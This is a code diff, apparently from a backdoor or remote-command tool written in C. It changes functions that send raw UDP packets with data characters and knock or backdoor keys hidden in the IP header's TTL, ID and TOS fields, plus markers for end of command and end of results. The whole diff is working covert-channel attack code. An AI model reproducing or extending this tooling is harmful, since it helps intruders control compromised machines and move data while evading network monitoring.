@@ -85,9 +85,6 @@ int rand_delay(int delay) {
     return rand() % delay + 1;
 }
 
-void cover_udp_recv(){
-
-}
 void covert_udp_send_data(char *sip, char *dip, unsigned short sport, unsigned short dport, char* data, int covert_channel){
 
     for(int i = 0; i<= strlen(data); i++){
@@ -119,29 +116,31 @@ void covert_udp_send(char *sip, char *dip, unsigned short sport, unsigned short 
     sin.sin_family = AF_INET;
     sin.sin_port = htons(dport);
     sin.sin_addr.s_addr = inet_addr (dip);
-    printf("data[0]%c",data[0]);
     if(covert_channel == 1) {
-        ip_header->id = data[0];
+        ip_header->ttl = data[0];
+        ip_header->id = 'b';
         printf("sending: %c\n", data[0]);
-        ip_header->tos = 0;
+        ip_header->tos = 'l';
     }else if(covert_channel == 2){
         //key for port knocking
+        ip_header->ttl = 0;
         ip_header->id = 'l';  //enter a single ASCII character into the field
         ip_header->tos = 'b';
     }else if(covert_channel == 3){
-        ip_header->id = 'x';  //enter a single ASCII character into the field
-        ip_header->tos = 'x';
+        //end of command
+        ip_header->ttl = 'c';
+        ip_header->id = 'c';  //enter a single ASCII character into the field
+        ip_header->tos = 'c';
     }else {
-        //key for backdoor
-        ip_header->id = 'b';  //enter a single ASCII character into the field
-        ip_header->tos = 'l';
+        //end of results
+        ip_header->ttl = 'r';
+        ip_header->id = 'r';  //enter a single ASCII character into the field
+        ip_header->tos = 'r';
     }
-    ip_header->tos = 0;
     ip_header->ihl = 5;
     ip_header->version = 4;
     ip_header->tot_len = sizeof (struct iphdr) + sizeof (struct udphdr);
     ip_header->frag_off = 0;
-    ip_header->ttl = 'b';
     ip_header->protocol = IPPROTO_UDP;
     ip_header->check = 0;
     ip_header->saddr = inet_addr (source_ip);
